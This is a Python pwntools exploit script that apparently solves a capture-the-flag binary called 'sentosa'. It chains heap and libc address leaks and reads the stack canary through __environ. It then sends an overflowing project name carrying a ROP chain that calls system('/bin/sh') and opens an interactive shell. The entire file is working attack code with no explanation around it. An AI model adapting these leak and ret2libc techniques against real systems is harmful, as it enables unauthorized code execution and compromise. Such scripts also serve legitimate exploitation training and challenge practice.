#!/usr/bin/env python

from pwn import *

#context.log_level = 'debug'

io = process(['./sentosa'], env={'LD_PRELOAD':'./libc-2.23.so'})
libc = ELF('libc-2.23.so')

def start_proj(length, name, price, area, capacity):
    io.sendlineafter("Exit\n", '1')
    io.sendlineafter("name: ", str(length))
    io.sendlineafter("name: ", name)
    io.sendlineafter("price: ", str(price))
    io.sendlineafter("area: ", str(area))
    io.sendlineafter("capacity: ", str(capacity))

def view_proj():
    io.sendlineafter("Exit\n", '2')

def cancel_proj(idx):
    io.sendlineafter("Exit\n", '4')
    io.sendlineafter("number: ", str(idx))

def leak_heap():
    global heap_base

    start_proj(0, 'A', 1, 1, 1)         # 0
    start_proj(0, 'A'*0x5a, 1, 1, 1)    # 1
    start_proj(0, 'A', 1, 1, 1)         # 2
    cancel_proj(2)
    cancel_proj(0)

    view_proj()
    io.recvuntil("Capacity: ")
    leak = int(io.recvline()[:-1], 10) & 0xffffffff
    heap_base = (0x55<<40) + (leak<<8)      # 0x55 or 0x56

    log.info("heap base: 0x%x" % heap_base)

def leak_libc():
    global libc_base

    start_proj(0xf, 'A', 0xd1, 0, 0x64)                     # 0
    start_proj(0x50, '\x01', 1, 1, 1)                       # 2
    start_proj(0x50, 'A'*0x44+'\x21', 1, 1, 1)              # 3
    start_proj(0, 'A'*0x5a + p64(heap_base+0x90), 1, 1, 1)  # 4
    start_proj(0, 'A'*0x5a + p64(heap_base+0x8b), 1, 1, 1)  # 5
    cancel_proj(4)

    view_proj()
    for i in range(5):
        io.recvuntil("Area: ")
    leak_low = int(io.recvline()[:-1], 10) & 0xffffffff
    io.recvuntil("Capacity: ")
    leak_high = int(io.recvline()[:-1], 10) & 0xffff
    libc_base = leak_low + (leak_high<<32) - 0x3c3b78

    log.info("libc base: 0x%x" % libc_base)

def leak_stack_canary():
    global canary

    environ_addr = libc.symbols['__environ'] + libc_base
    log.info("__environ address: 0x%x" % environ_addr)

    start_proj(0, 'A'*0x5a + p64(environ_addr - 9) , 1, 1, 1)   # 4

    view_proj()
    for i in range(5):
        io.recvuntil("Price: ")
    leak_low = int(io.recvline()[:-1], 10) & 0xffffffff
    io.recvuntil("Area: ")
    leak_high = int(io.recvline()[:-1], 10) & 0xffff
    stack_addr = leak_low + (leak_high<<32)
    canary_addr = stack_addr - 0x130

    log.info("stack address: 0x%x" % stack_addr)
    log.info("canary address: 0x%x" % canary_addr)

    start_proj(0, 'A'*0x5a + p64(canary_addr - 3), 1, 1, 1)     # 6

    view_proj()
    for i in range(7):
        io.recvuntil("Project: ")
    canary = (u64(io.recvline()[:-1] + "\x00"))<<8

    log.info("canary: 0x%x" % canary)

def pwn():
    pop_rdi_ret = libc_base + 0x21102
    bin_sh = libc_base + next(libc.search('/bin/sh\x00'))
    system_addr = libc_base + libc.symbols['system']

    payload  = "A" * 0x68
    payload += p64(canary)      # canary
    payload += "A" * 0x28
    payload += p64(pop_rdi_ret) # return address
    payload += p64(bin_sh)
    payload += p64(system_addr) # system("/bin/sh")

    start_proj(0, payload, 1, 1, 1)

    io.interactive()

if __name__ == "__main__":
    leak_heap()
    leak_libc()
    leak_stack_canary()
    pwn()
